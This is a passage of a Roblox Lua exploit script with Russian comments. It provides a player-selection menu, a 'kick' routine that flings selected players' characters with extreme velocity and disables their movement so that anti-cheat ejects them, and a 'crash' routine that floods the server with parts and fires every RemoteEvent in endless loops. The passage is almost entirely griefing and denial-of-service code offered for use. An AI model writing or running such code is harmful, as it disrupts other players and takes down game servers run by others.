local function updatePlayerList()
    for _, child in ipairs(playerList:GetChildren()) do
        if child:IsA("TextButton") then child:Destroy() end
    end
    playerButtons = {}

    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LocalPlayer then
            local b = Instance.new("TextButton")
            b.Size = UDim2.new(1, -4, 0, 28)
            b.Text = plr.Name
            b.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
            b.BorderSizePixel = 0
            b.TextColor3 = Color3.fromRGB(200, 200, 220)
            b.Font = Enum.Font.Gotham
            b.TextSize = 14
            b.TextXAlignment = Enum.TextXAlignment.Left
            b.Parent = playerList
            local corner = Instance.new("UICorner")
            corner.CornerRadius = UDim.new(0, 4)
            corner.Parent = b

            if selectedPlayers[plr] then
                b.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
            end

            b.MouseButton1Click:Connect(function()
                if selectedPlayers[plr] then
                    selectedPlayers[plr] = nil
                    b.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
                else
                    selectedPlayers[plr] = true
                    b.BackgroundColor3 = Color3.fromRGB(0, 100, 200)
                end
                updateStatus()
            end)

            playerButtons[plr] = b
        end
    end

    local count = #playerList:GetChildren() - 1
    playerList.CanvasSize = UDim2.new(0, 0, 0, count * 32 + 10)
end

local function updateStatus()
    local count = 0
    for _ in pairs(selectedPlayers) do count = count + 1 end
    if count == 0 then
        statusLabel.Text = "Выберите игроков"
        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
    else
        statusLabel.Text = "Выбрано: " .. count .. " игроков"
        statusLabel.TextColor3 = Color3.fromRGB(150, 200, 150)
    end
end

-- ========== KICK (античит выносит) ==========
local function kickPlayer(target)
    if not target or not target.Character then return end
    local root = target.Character:FindFirstChild("HumanoidRootPart")
    if not root then return end

    -- Резкий полёт вверх с огромной скоростью – античит расценит как читерство
    local force = Vector3.new(math.random(-500, 500), 10000, math.random(-500, 500))
    root.Velocity = force

    -- Дополнительные толчки для гарантии
    local bv = Instance.new("BodyVelocity")
    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
    bv.Velocity = force
    bv.Parent = root

    local bt = Instance.new("BodyThrust")
    bt.Force = force * 1000
    bt.Location = root.Position
    bt.Parent = root

    -- Создаём кучу частей вокруг игрока (перегрузка клиента)
    for i = 1, 20 do
        local part = Instance.new("Part")
        part.Size = Vector3.new(1, 1, 1)
        part.Position = root.Position + Vector3.new(math.random(-50, 50), math.random(-50, 50), math.random(-50, 50))
        part.Anchored = true
        part.Parent = game.Workspace
        game:GetService("Debris"):AddItem(part, 0.5)
    end

    -- Отключаем Humanoid, чтобы он не мог остановиться
    local humanoid = target.Character:FindFirstChild("Humanoid")
    if humanoid then
        humanoid.PlatformStand = true
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping, false)
        humanoid:SetStateEnabled(Enum.HumanoidStateType.Running, false)
    end

    task.wait(0.3)
    bv:Destroy()
    bt:Destroy()
end

-- ========== CRASH (обрушить сервер) ==========
local function crashServer()
    -- Спамим новыми объектами в Workspace (перегрузка сервера)
    for i = 1, 500 do
        local p = Instance.new("Part")
        p.Size = Vector3.new(10, 10, 10)
        p.Position = Vector3.new(math.random(-1000, 1000), math.random(0, 100), math.random(-1000, 1000))
        p.Anchored = true
        p.Parent = game.Workspace
        p.Name = "CrashPart_" .. i
    end

    -- Создаём тысячи удалённых событий (спам)
    for i = 1, 100 do
        local re = Instance.new("RemoteEvent")
        re.Name = "CrashEvent_" .. i
        re.Parent = game.ReplicatedStorage
    end

    -- Бесконечный цикл с созданием частей (если сервер не прибьёт)
    spawn(function()
        while true do
            local p = Instance.new("Part")
            p.Size = Vector3.new(5, 5, 5)
            p.Position = Vector3.new(math.random(-500, 500), math.random(0, 200), math.random(-500, 500))
            p.Anchored = true
            p.Parent = game.Workspace
            p.Name = "SpamPart"
            game:GetService("Debris"):AddItem(p, 0.1)
            task.wait()
        end
    end)

    -- Отправляем фейковые RemoteEvent вызовы (если есть)
    for _, re in ipairs(game.ReplicatedStorage:GetChildren()) do
        if re:IsA("RemoteEvent") then
            spawn(function()
                while true do
                    pcall(function()
                        re:FireServer("CRASH", "SPAM", "KILL")
                    end)
                    task.wait()
                end
            end)
        end
    end

    statusLabel.Text = "💀 CRASH ЗАПУЩЕН!"
    statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
end

-- ========== ЗАПУСК ДЕЙСТВИЙ ==========
local function startAction(mode)
    if isRunning then return end

    local targets = {}
    for plr, _ in pairs(selectedPlayers) do
        if plr and plr.Character then
            table.insert(targets, plr)
        end
    end

    if #targets == 0 and mode ~= "crash" then
        statusLabel.Text = "❌ Нет целей!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        task.wait(1)
        updateStatus()
        return
    end

    isRunning = true
    statusLabel.Text = "⏳ Выполняется..."
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 100)

    if mode == "kick" then
        for _, plr in ipairs(targets) do
            kickPlayer(plr)
            task.wait(0.1)
        end
    elseif mode == "crash" then
        crashServer()
    end

    isRunning = false
    updateStatus()
end

